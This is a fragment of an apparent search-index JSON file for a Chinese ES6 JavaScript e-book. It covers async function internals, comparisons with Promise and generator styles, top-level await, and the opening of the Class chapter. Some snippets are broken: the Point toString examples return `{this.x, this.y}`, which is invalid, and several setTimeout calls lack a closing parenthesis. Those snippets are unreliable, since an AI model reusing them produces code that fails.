<p>\u73b0\u5728\u5c06\u8fd9\u4e2a\u4f8b\u5b50\u6539\u6210<code>async</code>\u51fd\u6570\u3002</p> <pre><code>const a = async () =&gt; {\n  await b();\n  c();\n};\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>b()</code>\u8fd0\u884c\u7684\u65f6\u5019\uff0c<code>a()</code>\u662f\u6682\u505c\u6267\u884c\uff0c\u4e0a\u4e0b\u6587\u73af\u5883\u90fd\u4fdd\u5b58\u7740\u3002\u4e00\u65e6<code>b()</code>\u6216<code>c()</code>\u62a5\u9519\uff0c\u9519\u8bef\u5806\u6808\u5c06\u5305\u62ec<code>a()</code>\u3002</p>"},{"location":"ebook-JSES6-RYF/20-async%20%E5%87%BD%E6%95%B0/#async_1","title":"async \u51fd\u6570\u7684\u5b9e\u73b0\u539f\u7406","text":"<p>async \u51fd\u6570\u7684\u5b9e\u73b0\u539f\u7406\uff0c\u5c31\u662f\u5c06 Generator \u51fd\u6570\u548c\u81ea\u52a8\u6267\u884c\u5668\uff0c\u5305\u88c5\u5728\u4e00\u4e2a\u51fd\u6570\u91cc\u3002</p> <pre><code>async function fn(args) {\n  // ...\n}\n\n// \u7b49\u540c\u4e8e\n\nfunction fn(args) {\n  return spawn(function* () {\n    // ...\n  });\n}\n</code></pre> <p>\u6240\u6709\u7684<code>async</code>\u51fd\u6570\u90fd\u53ef\u4ee5\u5199\u6210\u4e0a\u9762\u7684\u7b2c\u4e8c\u79cd\u5f62\u5f0f\uff0c\u5176\u4e2d\u7684<code>spawn</code>\u51fd\u6570\u5c31\u662f\u81ea\u52a8\u6267\u884c\u5668\u3002</p> <p>\u4e0b\u9762\u7ed9\u51fa<code>spawn</code>\u51fd\u6570\u7684\u5b9e\u73b0\uff0c\u57fa\u672c\u5c31\u662f\u524d\u6587\u81ea\u52a8\u6267\u884c\u5668\u7684\u7ffb\u7248\u3002</p> <pre><code>function spawn(genF) {\n  return new Promise(function(resolve, reject) {\n    const gen = genF();\n    function step(nextF) {\n      let next;\n      try {\n        next = nextF();\n      } catch(e) {\n        return reject(e);\n      }\n      if(next.done) {\n        return resolve(next.value);\n      }\n      Promise.resolve(next.value).then(function(v) {\n        step(function() { return gen.next(v); });\n      }, function(e) {\n        step(function() { return gen.throw(e); });\n      });\n    }\n    step(function() { return gen.next(undefined); });\n  });\n}\n</code></pre>"},{"location":"ebook-JSES6-RYF/20-async%20%E5%87%BD%E6%95%B0/#_7","title":"\u4e0e\u5176\u4ed6\u5f02\u6b65\u5904\u7406\u65b9\u6cd5\u7684\u6bd4\u8f83","text":"<p>\u6211\u4eec\u901a\u8fc7\u4e00\u4e2a\u4f8b\u5b50\uff0c\u6765\u770b async \u51fd\u6570\u4e0e Promise\u3001Generator \u51fd\u6570\u7684\u6bd4\u8f83\u3002</p> <p>\u5047\u5b9a\u67d0\u4e2a DOM \u5143\u7d20\u4e0a\u9762\uff0c\u90e8\u7f72\u4e86\u4e00\u7cfb\u5217\u7684\u52a8\u753b\uff0c\u524d\u4e00\u4e2a\u52a8\u753b\u7ed3\u675f\uff0c\u624d\u80fd\u5f00\u59cb\u540e\u4e00\u4e2a\u3002\u5982\u679c\u5f53\u4e2d\u6709\u4e00\u4e2a\u52a8\u753b\u51fa\u9519\uff0c\u5c31\u4e0d\u518d\u5f80\u4e0b\u6267\u884c\uff0c\u8fd4\u56de\u4e0a\u4e00\u4e2a\u6210\u529f\u6267\u884c\u7684\u52a8\u753b\u7684\u8fd4\u56de\u503c\u3002</p> <p>\u9996\u5148\u662f Promise \u7684\u5199\u6cd5\u3002</p> <pre><code>function chainAnimationsPromise(elem, animations) {\n\n  // \u53d8\u91cfret\u7528\u6765\u4fdd\u5b58\u4e0a\u4e00\u4e2a\u52a8\u753b\u7684\u8fd4\u56de\u503c\n  let ret = null;\n\n  // \u65b0\u5efa\u4e00\u4e2a\u7a7a\u7684Promise\n  let p = Promise.resolve();\n\n  // \u4f7f\u7528then\u65b9\u6cd5\uff0c\u6dfb\u52a0\u6240\u6709\u52a8\u753b\n  for(let anim of animations) {\n    p = p.then(function(val) {\n      ret = val;\n      return anim(elem);\n    });\n  }\n\n  // \u8fd4\u56de\u4e00\u4e2a\u90e8\u7f72\u4e86\u9519\u8bef\u6355\u6349\u673a\u5236\u7684Promise\n  return p.catch(function(e) {\n    /* \u5ffd\u7565\u9519\u8bef\uff0c\u7ee7\u7eed\u6267\u884c */\n  }).then(function() {\n    return ret;\n  });\n\n}\n</code></pre> <p>\u867d\u7136 Promise \u7684\u5199\u6cd5\u6bd4\u56de\u8c03\u51fd\u6570\u7684\u5199\u6cd5\u5927\u5927\u6539\u8fdb\uff0c\u4f46\u662f\u4e00\u773c\u770b\u4e0a\u53bb\uff0c\u4ee3\u7801\u5b8c\u5168\u90fd\u662f Promise \u7684 API\uff08<code>then</code>\u3001<code>catch</code>\u7b49\u7b49\uff09\uff0c\u64cd\u4f5c\u672c\u8eab\u7684\u8bed\u4e49\u53cd\u800c\u4e0d\u5bb9\u6613\u770b\u51fa\u6765\u3002</p> <p>\u63a5\u7740\u662f Generator \u51fd\u6570\u7684\u5199\u6cd5\u3002</p> <pre><code>function chainAnimationsGenerator(elem, animations) {\n\n  return spawn(function*() {\n    let ret = null;\n    try {\n      for(let anim of animations) {\n        ret = yield anim(elem);\n      }\n    } catch(e) {\n      /* \u5ffd\u7565\u9519\u8bef\uff0c\u7ee7\u7eed\u6267\u884c */\n    }\n    return ret;\n  });\n\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4f7f\u7528 Generator \u51fd\u6570\u904d\u5386\u4e86\u6bcf\u4e2a\u52a8\u753b\uff0c\u8bed\u4e49\u6bd4 Promise \u5199\u6cd5\u66f4\u6e05\u6670\uff0c\u7528\u6237\u5b9a\u4e49\u7684\u64cd\u4f5c\u5168\u90e8\u90fd\u51fa\u73b0\u5728<code>spawn</code>\u51fd\u6570\u7684\u5185\u90e8\u3002\u8fd9\u4e2a\u5199\u6cd5\u7684\u95ee\u9898\u5728\u4e8e\uff0c\u5fc5\u987b\u6709\u4e00\u4e2a\u4efb\u52a1\u8fd0\u884c\u5668\uff0c\u81ea\u52a8\u6267\u884c Generator \u51fd\u6570\uff0c\u4e0a\u9762\u4ee3\u7801\u7684<code>spawn</code>\u51fd\u6570\u5c31\u662f\u81ea\u52a8\u6267\u884c\u5668\uff0c\u5b83\u8fd4\u56de\u4e00\u4e2a Promise \u5bf9\u8c61\uff0c\u800c\u4e14\u5fc5\u987b\u4fdd\u8bc1<code>yield</code>\u8bed\u53e5\u540e\u9762\u7684\u8868\u8fbe\u5f0f\uff0c\u5fc5\u987b\u8fd4\u56de\u4e00\u4e2a Promise\u3002</p> <p>\u6700\u540e\u662f async \u51fd\u6570\u7684\u5199\u6cd5\u3002</p> <pre><code>async function chainAnimationsAsync(elem, animations) {\n  let ret = null;\n  try {\n    for(let anim of animations) {\n      ret = await anim(elem);\n    }\n  } catch(e) {\n    /* \u5ffd\u7565\u9519\u8bef\uff0c\u7ee7\u7eed\u6267\u884c */\n  }\n  return ret;\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230 Async \u51fd\u6570\u7684\u5b9e\u73b0\u6700\u7b80\u6d01\uff0c\u6700\u7b26\u5408\u8bed\u4e49\uff0c\u51e0\u4e4e\u6ca1\u6709\u8bed\u4e49\u4e0d\u76f8\u5173\u7684\u4ee3\u7801\u3002\u5b83\u5c06 Generator \u5199\u6cd5\u4e2d\u7684\u81ea\u52a8\u6267\u884c\u5668\uff0c\u6539\u5728\u8bed\u8a00\u5c42\u9762\u63d0\u4f9b\uff0c\u4e0d\u66b4\u9732\u7ed9\u7528\u6237\uff0c\u56e0\u6b64\u4ee3\u7801\u91cf\u6700\u5c11\u3002\u5982\u679c\u4f7f\u7528 Generator \u5199\u6cd5\uff0c\u81ea\u52a8\u6267\u884c\u5668\u9700\u8981\u7528\u6237\u81ea\u5df1\u63d0\u4f9b\u3002</p>"},{"location":"ebook-JSES6-RYF/20-async%20%E5%87%BD%E6%95%B0/#_8","title":"\u5b9e\u4f8b\uff1a\u6309\u987a\u5e8f\u5b8c\u6210\u5f02\u6b65\u64cd\u4f5c","text":"<p>\u5b9e\u9645\u5f00\u53d1\u4e2d\uff0c\u7ecf\u5e38\u9047\u5230\u4e00\u7ec4\u5f02\u6b65\u64cd\u4f5c\uff0c\u9700\u8981\u6309\u7167\u987a\u5e8f\u5b8c\u6210\u3002\u6bd4\u5982\uff0c\u4f9d\u6b21\u8fdc\u7a0b\u8bfb\u53d6\u4e00\u7ec4 URL\uff0c\u7136\u540e\u6309\u7167\u8bfb\u53d6\u7684\u987a\u5e8f\u8f93\u51fa\u7ed3\u679c\u3002</p> <p>Promise \u7684\u5199\u6cd5\u5982\u4e0b\u3002</p> <pre><code>function logInOrder(urls) {\n  // \u8fdc\u7a0b\u8bfb\u53d6\u6240\u6709URL\n  const textPromises = urls.map(url =&gt; {\n    return fetch(url).then(response =&gt; response.text());\n  });\n\n  // \u6309\u6b21\u5e8f\u8f93\u51fa\n  textPromises.reduce((chain, textPromise) =&gt; {\n    return chain.then(() =&gt; textPromise)\n      .then(text =&gt; console.log(text));\n  }, Promise.resolve());\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4f7f\u7528<code>fetch</code>\u65b9\u6cd5\uff0c\u540c\u65f6\u8fdc\u7a0b\u8bfb\u53d6\u4e00\u7ec4 URL\u3002\u6bcf\u4e2a<code>fetch</code>\u64cd\u4f5c\u90fd\u8fd4\u56de\u4e00\u4e2a Promise \u5bf9\u8c61\uff0c\u653e\u5165<code>textPromises</code>\u6570\u7ec4\u3002\u7136\u540e\uff0c<code>reduce</code>\u65b9\u6cd5\u4f9d\u6b21\u5904\u7406\u6bcf\u4e2a Promise \u5bf9\u8c61\uff0c\u7136\u540e\u4f7f\u7528<code>then</code>\uff0c\u5c06\u6240\u6709 Promise \u5bf9\u8c61\u8fde\u8d77\u6765\uff0c\u56e0\u6b64\u5c31\u53ef\u4ee5\u4f9d\u6b21\u8f93\u51fa\u7ed3\u679c\u3002</p> <p>\u8fd9\u79cd\u5199\u6cd5\u4e0d\u592a\u76f4\u89c2\uff0c\u53ef\u8bfb\u6027\u6bd4\u8f83\u5dee\u3002\u4e0b\u9762\u662f async \u51fd\u6570\u5b9e\u73b0\u3002</p> <pre><code>async function logInOrder(urls) {\n  for (const url of urls) {\n    const response = await fetch(url);\n    console.log(await response.text());\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u786e\u5b9e\u5927\u5927\u7b80\u5316\uff0c\u95ee\u9898\u662f\u6240\u6709\u8fdc\u7a0b\u64cd\u4f5c\u90fd\u662f\u7ee7\u53d1\u3002\u53ea\u6709\u524d\u4e00\u4e2a URL \u8fd4\u56de\u7ed3\u679c\uff0c\u624d\u4f1a\u53bb\u8bfb\u53d6\u4e0b\u4e00\u4e2a URL\uff0c\u8fd9\u6837\u505a\u6548\u7387\u5f88\u5dee\uff0c\u975e\u5e38\u6d6a\u8d39\u65f6\u95f4\u3002\u6211\u4eec\u9700\u8981\u7684\u662f\u5e76\u53d1\u53d1\u51fa\u8fdc\u7a0b\u8bf7\u6c42\u3002</p> <pre><code>async function logInOrder(urls) {\n  // \u5e76\u53d1\u8bfb\u53d6\u8fdc\u7a0bURL\n  const textPromises = urls.map(async url =&gt; {\n    const response = await fetch(url);\n    return response.text();\n  });\n\n  // \u6309\u6b21\u5e8f\u8f93\u51fa\n  for (const textPromise of textPromises) {\n    console.log(await textPromise);\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u867d\u7136<code>map</code>\u65b9\u6cd5\u7684\u53c2\u6570\u662f<code>async</code>\u51fd\u6570\uff0c\u4f46\u5b83\u662f\u5e76\u53d1\u6267\u884c\u7684\uff0c\u56e0\u4e3a\u53ea\u6709<code>async</code>\u51fd\u6570\u5185\u90e8\u662f\u7ee7\u53d1\u6267\u884c\uff0c\u5916\u90e8\u4e0d\u53d7\u5f71\u54cd\u3002\u540e\u9762\u7684<code>for..of</code>\u5faa\u73af\u5185\u90e8\u4f7f\u7528\u4e86<code>await</code>\uff0c\u56e0\u6b64\u5b9e\u73b0\u4e86\u6309\u987a\u5e8f\u8f93\u51fa\u3002</p>"},{"location":"ebook-JSES6-RYF/20-async%20%E5%87%BD%E6%95%B0/#await_1","title":"\u9876\u5c42 await","text":"<p>\u6839\u636e\u8bed\u6cd5\u89c4\u683c\uff0c<code>await</code>\u547d\u4ee4\u53ea\u80fd\u51fa\u73b0\u5728 async \u51fd\u6570\u5185\u90e8\uff0c\u5426\u5219\u90fd\u4f1a\u62a5\u9519\u3002</p> <pre><code>// \u62a5\u9519\nconst data = await fetch('https://api.example.com');\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>await</code>\u547d\u4ee4\u72ec\u7acb\u4f7f\u7528\uff0c\u6ca1\u6709\u653e\u5728 async \u51fd\u6570\u91cc\u9762\uff0c\u5c31\u4f1a\u62a5\u9519\u3002</p> <p>\u76ee\u524d\uff0c\u6709\u4e00\u4e2a\u8bed\u6cd5\u63d0\u6848\uff0c\u5141\u8bb8\u5728\u6a21\u5757\u7684\u9876\u5c42\u72ec\u7acb\u4f7f\u7528<code>await</code>\u547d\u4ee4\u3002\u8fd9\u4e2a\u63d0\u6848\u7684\u76ee\u7684\uff0c\u662f\u501f\u7528<code>await</code>\u89e3\u51b3\u6a21\u5757\u5f02\u6b65\u52a0\u8f7d\u7684\u95ee\u9898\u3002</p> <pre><code>// awaiting.js\nlet output;\nasync function main() {\n  const dynamic = await import(someMission);\n  const data = await fetch(url);\n  output = someProcess(dynamic.default, data);\n}\nmain();\nexport { output };\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6a21\u5757<code>awaiting.js</code>\u7684\u8f93\u51fa\u503c<code>output</code>\uff0c\u53d6\u51b3\u4e8e\u5f02\u6b65\u64cd\u4f5c\u3002\u6211\u4eec\u628a\u5f02\u6b65\u64cd\u4f5c\u5305\u88c5\u5728\u4e00\u4e2a async \u51fd\u6570\u91cc\u9762\uff0c\u7136\u540e\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\uff0c\u53ea\u6709\u7b49\u91cc\u9762\u7684\u5f02\u6b65\u64cd\u4f5c\u90fd\u6267\u884c\uff0c\u53d8\u91cf<code>output</code>\u624d\u4f1a\u6709\u503c\uff0c\u5426\u5219\u5c31\u8fd4\u56de<code>undefined</code>\u3002</p> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u4e5f\u53ef\u4ee5\u5199\u6210\u7acb\u5373\u6267\u884c\u51fd\u6570\u7684\u5f62\u5f0f\u3002</p> <pre><code>// awaiting.js\nlet output;\n(async function main() {\n  const dynamic = await import(someMission);\n  const data = await fetch(url);\n  output = someProcess(dynamic.default, data);\n})();\nexport { output };\n</code></pre> <p>\u4e0b\u9762\u662f\u52a0\u8f7d\u8fd9\u4e2a\u6a21\u5757\u7684\u5199\u6cd5\u3002</p> <pre><code>// usage.js\nimport { output } from \"./awaiting.js\";\n\nfunction outputPlusValue(value) { return output + value }\n\nconsole.log(outputPlusValue(100));\nsetTimeout(() =&gt; console.log(outputPlusValue(100), 1000);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>outputPlusValue()</code>\u7684\u6267\u884c\u7ed3\u679c\uff0c\u5b8c\u5168\u53d6\u51b3\u4e8e\u6267\u884c\u7684\u65f6\u95f4\u3002\u5982\u679c<code>awaiting.js</code>\u91cc\u9762\u7684\u5f02\u6b65\u64cd\u4f5c\u6ca1\u6267\u884c\u5b8c\uff0c\u52a0\u8f7d\u8fdb\u6765\u7684<code>output</code>\u7684\u503c\u5c31\u662f<code>undefined</code>\u3002</p> <p>\u76ee\u524d\u7684\u89e3\u51b3\u65b9\u6cd5\uff0c\u5c31\u662f\u8ba9\u539f\u59cb\u6a21\u5757\u8f93\u51fa\u4e00\u4e2a Promise \u5bf9\u8c61\uff0c\u4ece\u8fd9\u4e2a Promise \u5bf9\u8c61\u5224\u65ad\u5f02\u6b65\u64cd\u4f5c\u6709\u6ca1\u6709\u7ed3\u675f\u3002</p> <pre><code>// awaiting.js\nlet output;\nexport default (async function main() {\n  const dynamic = await import(someMission);\n  const data = await fetch(url);\n  output = someProcess(dynamic.default, data);\n})();\nexport { output };\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>awaiting.js</code>\u9664\u4e86\u8f93\u51fa<code>output</code>\uff0c\u8fd8\u9ed8\u8ba4\u8f93\u51fa\u4e00\u4e2a Promise \u5bf9\u8c61\uff08async \u51fd\u6570\u7acb\u5373\u6267\u884c\u540e\uff0c\u8fd4\u56de\u4e00\u4e2a Promise \u5bf9\u8c61\uff09\uff0c\u4ece\u8fd9\u4e2a\u5bf9\u8c61\u5224\u65ad\u5f02\u6b65\u64cd\u4f5c\u662f\u5426\u7ed3\u675f\u3002</p> <p>\u4e0b\u9762\u662f\u52a0\u8f7d\u8fd9\u4e2a\u6a21\u5757\u7684\u65b0\u7684\u5199\u6cd5\u3002</p> <pre><code>// usage.js\nimport promise, { output } from \"./awaiting.js\";\n\nfunction outputPlusValue(value) { return output + value }\n\npromise.then(() =&gt; {\n  console.log(outputPlusValue(100));\n  setTimeout(() =&gt; console.log(outputPlusValue(100), 1000);\n});\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5c06<code>awaiting.js</code>\u5bf9\u8c61\u7684\u8f93\u51fa\uff0c\u653e\u5728<code>promise.then()</code>\u91cc\u9762\uff0c\u8fd9\u6837\u5c31\u80fd\u4fdd\u8bc1\u5f02\u6b65\u64cd\u4f5c\u5b8c\u6210\u4ee5\u540e\uff0c\u624d\u53bb\u8bfb\u53d6<code>output</code>\u3002</p> <p>\u8fd9\u79cd\u5199\u6cd5\u6bd4\u8f83\u9ebb\u70e6\uff0c\u7b49\u4e8e\u8981\u6c42\u6a21\u5757\u7684\u4f7f\u7528\u8005\u9075\u5b88\u4e00\u4e2a\u989d\u5916\u7684\u4f7f\u7528\u534f\u8bae\uff0c\u6309\u7167\u7279\u6b8a\u7684\u65b9\u6cd5\u4f7f\u7528\u8fd9\u4e2a\u6a21\u5757\u3002\u4e00\u65e6\u4f60\u5fd8\u4e86\u8981\u7528 Promise \u52a0\u8f7d\uff0c\u53ea\u4f7f\u7528\u6b63\u5e38\u7684\u52a0\u8f7d\u65b9\u6cd5\uff0c\u4f9d\u8d56\u8fd9\u4e2a\u6a21\u5757\u7684\u4ee3\u7801\u5c31\u53ef\u80fd\u51fa\u9519\u3002\u800c\u4e14\uff0c\u5982\u679c\u4e0a\u9762\u7684<code>usage.js</code>\u53c8\u6709\u5bf9\u5916\u7684\u8f93\u51fa\uff0c\u7b49\u4e8e\u8fd9\u4e2a\u4f9d\u8d56\u94fe\u7684\u6240\u6709\u6a21\u5757\u90fd\u8981\u4f7f\u7528 Promise \u52a0\u8f7d\u3002</p> <p>\u9876\u5c42\u7684<code>await</code>\u547d\u4ee4\uff0c\u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002\u5b83\u4fdd\u8bc1\u53ea\u6709\u5f02\u6b65\u64cd\u4f5c\u5b8c\u6210\uff0c\u6a21\u5757\u624d\u4f1a\u8f93\u51fa\u503c\u3002</p> <pre><code>// awaiting.js\nconst dynamic = import(someMission);\nconst data = fetch(url);\nexport const output = someProcess((await dynamic).default, await data);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e24\u4e2a\u5f02\u6b65\u64cd\u4f5c\u5728\u8f93\u51fa\u7684\u65f6\u5019\uff0c\u90fd\u52a0\u4e0a\u4e86<code>await</code>\u547d\u4ee4\u3002\u53ea\u6709\u7b49\u5230\u5f02\u6b65\u64cd\u4f5c\u5b8c\u6210\uff0c\u8fd9\u4e2a\u6a21\u5757\u624d\u4f1a\u8f93\u51fa\u503c\u3002</p> <p>\u52a0\u8f7d\u8fd9\u4e2a\u6a21\u5757\u7684\u5199\u6cd5\u5982\u4e0b\u3002</p> <pre><code>// usage.js\nimport { output } from \"./awaiting.js\";\nfunction outputPlusValue(value) { return output + value }\n\nconsole.log(outputPlusValue(100));\nsetTimeout(() =&gt; console.log(outputPlusValue(100), 1000);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684\u5199\u6cd5\uff0c\u4e0e\u666e\u901a\u7684\u6a21\u5757\u52a0\u8f7d\u5b8c\u5168\u4e00\u6837\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6a21\u5757\u7684\u4f7f\u7528\u8005\u5b8c\u5168\u4e0d\u7528\u5173\u5fc3\uff0c\u4f9d\u8d56\u6a21\u5757\u7684\u5185\u90e8\u6709\u6ca1\u6709\u5f02\u6b65\u64cd\u4f5c\uff0c\u6b63\u5e38\u52a0\u8f7d\u5373\u53ef\u3002</p> <p>\u8fd9\u65f6\uff0c\u6a21\u5757\u7684\u52a0\u8f7d\u4f1a\u7b49\u5f85\u4f9d\u8d56\u6a21\u5757\uff08\u4e0a\u4f8b\u662f<code>awaiting.js</code>\uff09\u7684\u5f02\u6b65\u64cd\u4f5c\u5b8c\u6210\uff0c\u624d\u6267\u884c\u540e\u9762\u7684\u4ee3\u7801\uff0c\u6709\u70b9\u50cf\u6682\u505c\u5728\u90a3\u91cc\u3002\u6240\u4ee5\uff0c\u5b83\u603b\u662f\u4f1a\u5f97\u5230\u6b63\u786e\u7684<code>output</code>\uff0c\u4e0d\u4f1a\u56e0\u4e3a\u52a0\u8f7d\u65f6\u673a\u7684\u4e0d\u540c\uff0c\u800c\u5f97\u5230\u4e0d\u4e00\u6837\u7684\u503c\u3002</p> <p>\u4e0b\u9762\u662f\u9876\u5c42<code>await</code>\u7684\u4e00\u4e9b\u4f7f\u7528\u573a\u666f\u3002</p> <pre><code>// import() \u65b9\u6cd5\u52a0\u8f7d\nconst strings = await import(`/i18n/${navigator.language}`);\n\n// \u6570\u636e\u5e93\u64cd\u4f5c\nconst connection = await dbConnector();\n\n// \u4f9d\u8d56\u56de\u6eda\nlet jQuery;\ntry {\n  jQuery = await import('https://cdn-a.com/jQuery');\n} catch {\n  jQuery = await import('https://cdn-b.com/jQuery');\n}\n</code></pre> <p>\u6ce8\u610f\uff0c\u5982\u679c\u52a0\u8f7d\u591a\u4e2a\u5305\u542b\u9876\u5c42<code>await</code>\u547d\u4ee4\u7684\u6a21\u5757\uff0c\u52a0\u8f7d\u547d\u4ee4\u662f\u540c\u6b65\u6267\u884c\u7684\u3002</p> <pre><code>// x.js\nconsole.log(\"X1\");\nawait new Promise(r =&gt; setTimeout(r, 1000));\nconsole.log(\"X2\");\n\n// y.js\nconsole.log(\"Y\");\n\n// z.js\nimport \"./x.js\";\nimport \"./y.js\";\nconsole.log(\"Z\");\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u6709\u4e09\u4e2a\u6a21\u5757\uff0c\u6700\u540e\u7684<code>z.js</code>\u52a0\u8f7d<code>x.js</code>\u548c<code>y.js</code>\uff0c\u6253\u5370\u7ed3\u679c\u662f<code>X1</code>\u3001<code>Y</code>\u3001<code>X2</code>\u3001<code>Z</code>\u3002\u8fd9\u8bf4\u660e\uff0c<code>z.js</code>\u5e76\u6ca1\u6709\u7b49\u5f85<code>x.js</code>\u52a0\u8f7d\u5b8c\u6210\uff0c\u518d\u53bb\u52a0\u8f7d<code>y.js</code>\u3002</p> <p>\u9876\u5c42\u7684<code>await</code>\u547d\u4ee4\u6709\u70b9\u50cf\uff0c\u4ea4\u51fa\u4ee3\u7801\u7684\u6267\u884c\u6743\u7ed9\u5176\u4ed6\u7684\u6a21\u5757\u52a0\u8f7d\uff0c\u7b49\u5f02\u6b65\u64cd\u4f5c\u5b8c\u6210\u540e\uff0c\u518d\u62ff\u56de\u6267\u884c\u6743\uff0c\u7ee7\u7eed\u5411\u4e0b\u6267\u884c\u3002</p>"},{"location":"ebook-JSES6-RYF/21-Class%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/","title":"Class \u7684\u57fa\u672c\u8bed\u6cd5","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 25580  \u9605\u8bfb52\u5206\u949f</p>"},{"location":"ebook-JSES6-RYF/21-Class%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/#_1","title":"\u4ecb\u7ecd","text":""},{"location":"ebook-JSES6-RYF/21-Class%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/#_2","title":"\u7c7b","text":"<p>JavaScript ES5 \u4e2d\uff0c\u901a\u8fc7\u6784\u9020\u51fd\u6570\u751f\u6210\u5b9e\u4f8b\u5bf9\u8c61\u3002</p> <pre><code>function Point(x, y) {\n  this.x = x;\n  this.y = y;\n}\n\nPoint.prototype.toString = function () {\n  return {this.x, this.y};\n}\n\nvar p = new Point(1, 2);\n</code></pre> <p>\u4e0a\u9762\u8fd9\u79cd\u5199\u6cd5\u8ddf\u4f20\u7edf\u7684\u9762\u5411\u5bf9\u8c61\u8bed\u8a00\uff08 C++ \u548c Java\uff09\u5dee\u5f02\u5f88\u5927\u3002ES6 \u63d0\u4f9b\u4e86\u66f4\u63a5\u8fd1\u4f20\u7edf\u8bed\u8a00\u7684\u5199\u6cd5\uff0c\u5f15\u5165\u4e86 Class\uff08\u7c7b\uff09\u8fd9\u4e2a\u6982\u5ff5\uff0c\u4f5c\u4e3a\u5bf9\u8c61\u7684\u6a21\u677f\u3002\u901a\u8fc7<code>class</code>\u5173\u952e\u5b57\uff0c\u53ef\u4ee5\u5b9a\u4e49\u7c7b\u3002</p> <p>\u57fa\u672c\u4e0a\uff0cES6 \u7684<code>class</code>\u53ef\u4ee5\u770b\u4f5c\u53ea\u662f\u4e00\u4e2a\u8bed\u6cd5\u7cd6\uff0c\u5b83\u7684\u7edd\u5927\u90e8\u5206\u529f\u80fd\uff0cES5 \u90fd\u53ef\u4ee5\u505a\u5230\uff0c\u65b0\u7684<code>class</code>\u5199\u6cd5\u53ea\u662f\u8ba9\u5bf9\u8c61\u539f\u578b\u7684\u5199\u6cd5\u66f4\u52a0\u6e05\u6670\u3001\u66f4\u50cf\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u7684\u8bed\u6cd5\u800c\u5df2\u3002\u4e0a\u9762\u7684\u4ee3\u7801\u7528 ES6 \u7684<code>class</code>\u6539\u5199\uff0c\u5c31\u662f\u4e0b\u9762\u8fd9\u6837\u3002</p> <pre><code>class Point {\n  constructor(x, y) {\n    this.x = x;\n    this.y = y\n  }\n  toString() {\n    return { this.x, this.y };\n  }\n}\n</code></pre> <p>\u91cc\u9762\u6709\u4e00\u4e2a<code>constructor</code>\u65b9\u6cd5\uff0c\u8fd9\u5c31\u662f\u6784\u9020\u65b9\u6cd5\uff0c\u800c<code>this</code>\u5173\u952e\u5b57\u5219\u4ee3\u8868\u5b9e\u4f8b\u5bf9\u8c61\u3002\u4e5f\u5c31\u662f\u8bf4\uff0cES5 \u7684\u6784\u9020\u51fd\u6570<code>Point</code>\uff0c\u5bf9\u5e94 ES6 \u7684<code>Point</code>\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\u3002</p> <p><code>Point</code>\u7c7b\u9664\u4e86\u6784\u9020\u65b9\u6cd5\uff0c\u8fd8\u5b9a\u4e49\u4e86\u4e00\u4e2a<code>toString</code>\u65b9\u6cd5\u3002</p> <p>\u6ce8\u610f</p> <ul> <li> <p>\u5b9a\u4e49\u201c\u7c7b\u201d\u7684\u65b9\u6cd5\u7684\u65f6\u5019\uff0c\u524d\u9762\u4e0d\u9700\u8981\u52a0\u4e0a<code>function</code>\u8fd9\u4e2a\u5173\u952e\u5b57\uff0c\u76f4\u63a5\u628a\u51fd\u6570\u5b9a\u4e49\u653e\u8fdb\u53bb\u4e86\u5c31\u53ef\u4ee5\u4e86\u3002</p> </li> <li> <p>===\u65b9\u6cd5\u4e4b\u95f4\u4e0d\u9700\u8981\u9017\u53f7\u5206\u9694\uff0c\u52a0\u4e86\u4f1a\u62a5\u9519===\u3002</p> </li> </ul> <p>ES6 \u7684\u7c7b\uff0c\u5b8c\u5168\u53ef\u4ee5\u770b\u4f5c\u6784\u9020\u51fd\u6570\u7684\u53e6\u4e00\u79cd\u5199\u6cd5\u3002\u7c7b\u7684\u6570\u636e\u7c7b\u578b\u5c31\u662f\u51fd\u6570\uff0c\u7c7b\u672c\u8eab\u5c31\u6307\u5411\u6784\u9020\u51fd\u6570\u3002\u4f7f\u7528\u7684\u65f6\u5019\uff0c\u4e5f\u662f\u76f4\u63a5\u5bf9\u7c7b\u4f7f\u7528<code>new</code>\u547d\u4ee4\uff0c\u8ddf\u6784\u9020\u51fd\u6570\u7684\u7528\u6cd5\u5b8c\u5168\u4e00\u81f4\u3002</p> <pre><code>class Point {\n  // ...\n}\n\ntypeof Point // \"function\"\nPoint === Point.prototype.constructor // true\n</code></pre> <pre><code>class Bar {\n  doStuff() {\n    console.log('stuff');\n  }\n}\n\nvar b = new Bar();\nb.doStuff() // \"stuff\"\n</code></pre> <p>\u6784\u9020\u51fd\u6570\u7684<code>prototype</code>\u5c5e\u6027\uff0c\u5728 ES6 